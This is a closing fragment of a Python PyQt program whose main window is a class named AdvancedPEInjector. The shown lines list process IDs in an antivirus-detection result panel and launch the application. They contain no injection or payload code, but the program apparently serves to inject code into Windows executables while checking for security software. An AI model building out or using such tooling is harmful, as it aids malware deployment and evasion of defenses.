            self.av_result_text.append(f"    - PID: {pid} (状态: {status})")
    
    self.update_status("杀毒软件检测完成")

# 主函数
if __name__ == '__main__':
    app = QApplication(sys.argv)
    injector = AdvancedPEInjector()
    injector.show()
    sys.exit(app.exec_())
